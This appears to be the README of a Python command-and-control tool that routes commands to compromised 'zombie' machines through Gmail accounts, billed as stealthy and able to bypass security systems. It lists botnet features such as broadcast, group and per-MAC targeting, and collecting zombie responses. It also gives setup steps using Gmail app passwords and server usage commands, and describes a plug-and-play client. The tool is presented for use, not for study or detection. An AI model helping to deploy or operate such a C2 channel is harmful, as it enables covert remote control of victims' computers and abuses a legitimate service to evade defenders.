# Sealth Gmail C2 2024 Ready

## Introduction
The project consists of a completely stealthy C&C (Command and Control) solution with a Client/Server architecture. 
The project is written in Python and also works after Google's policy updates.
Read my Article about the project on redhotcyber.com(You will need to translate it) :
https://www.redhotcyber.com/post/come-realizzare-un-command-control-utilizzando-gmail-in-16-steps-per-bypassare-qualsiasi-sistema-di-sicurezza/


## Table of Contents

1. [Introduction](#introduction)
2. [Server Features](#serverfeatures)
3. [Client Features](#clientfeatures)
4. [Requirements](#requirements)
5. [Installation](#installation)
6. [Configuration](#configuration)
7. [Usage](#usage)


## Server Features

- Send Commands to Zombies
- Sending Filter (Send only to Windows Machines)
- Sending Filter (Send only to Linux Machines)
- Broadcast Communication
- Multicast Communication (Group must be specified)
- Unicast Communication (Mac address must be specified)
- Get Responses from zombies

## Client Features
- Receive commands from C&C Servers
- Send commands feedback to C&C Servers

## Requirements

- you ought to install Python3
- you need to install modules listed in requirements.txt

## Installation

#Install Requirements
  Once you cloned repository you have to install requirements listed in requirements.txt
  You should use this command: pip install -r requirements.txt

## Configuration
#Create two gmail account
  In order to use the solution you need to create two gmail accounts. These two need to be personal accounts.

#Generate Password app
  Follow official google guide to generate a password-app for both the two gmail account you created before.
  Link: https://support.google.com/mail/answer/185833?hl=en

#Put password app into the code
  Copy the password app you created in the previous step and paste it in either the client or the server script.

## Usage
Server.Py:

Command Example 1 -> Send "dir" command to all windows zombie

python3 Server.py -c dir -o windows -t broadcast


Commad Example 2 -> send "ifconfig" command to all linux zombie

python3 Server.py -c ifconfig -o linux -t broadcast


Commad Example 3 -> send "ifconfig" command to linux zombie into the phoenix group

python3 Server.py -c ifconfig -o linux -t multicast -g phoenix_group


Commad Example 4 -> send "ifconfig" command to a defined linux machine

python3 Server.py -c ifconfig -o linux -t unicast -m <mac_address>


Commad Example 5 -> Get Responses from zombies

python3 Server.py -c update

Client.Py:

No commands required, it is plug and play, just start it.


